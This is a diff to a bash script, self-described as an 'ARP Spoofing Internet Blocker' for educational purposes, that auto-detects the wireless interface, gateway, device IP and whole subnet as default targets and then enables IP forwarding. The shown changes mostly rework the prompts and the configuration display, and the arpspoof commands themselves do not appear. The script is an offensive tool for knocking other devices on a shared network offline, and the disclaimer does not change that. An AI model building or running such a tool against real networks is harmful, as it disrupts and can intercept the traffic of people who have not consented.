@@ -3,38 +3,51 @@
 # ARP Spoofing Internet Blocker (Educational Purposes Only)
 # Requires: arpspoof, iptables, and root privileges
 
-# Detect Interface
+# Detect Current Network Configuration 
 WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
-echo "Enter Wireless Interface: Enter by default"
+GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
+MASK=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
+IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
+echo ""
+echo "Current Network Configuration"
+echo ""
+echo "INTERFACE: | $WLAN"
+echo "GATEWAY:   | $GW"
+echo "DEVICE IP: | $IP"
+echo "TARGETS:   | $MASK"
+
+# Detect Interface
+echo "Enter Wireless Interface: Enter for default"
 read -p "> $WLAN " WLN
 INTERFACE="${WLN:-$WLAN}"
+echo ""
 
 # Detect Gateway IP
-GW=$(ip route show dev "$INTERFACE" | awk '/default/ {print $3}')
-echo "Enter Router Gateway IP: Enter by default"
-read -p "> $GW" INET
+echo "Enter Router Gateway IP: Enter for default"
+read -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
+echo ""
 
 # Detect Subnet
-MASK=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
-echo "Enter multiple target: $MASK"
-read -p "> " IPS
+echo "Enter multiple target: Enter for default"
+read -p "> $MASK " IPS
 TARGET_IPS="${IPS:-$MASK}"
+echo ""
 
 # Detect Device IP
-echo "Enter Device IP: Enter by default"
-IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
-read -p "> $IP" DEVIP
+echo "Enter Device IP: Enter for default"
+read -p "> $IP " DEVIP
 MYIP="${DEVIP:-$IP}"
-
 echo ""
+
 # Prompt configuration
 echo "Your Arpspoof Configurations..."
 echo ""
 echo "INTERFACE: | $INTERFACE"
 echo "GATEWAY:   | $GATEWAY"
-echo "MYIP:      | $MYIP"
+echo "DEVICE IP: | $MYIP"
 echo "TARGETS:   | $TARGET_IPS"
+echo ""
 
 # Enable IP Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
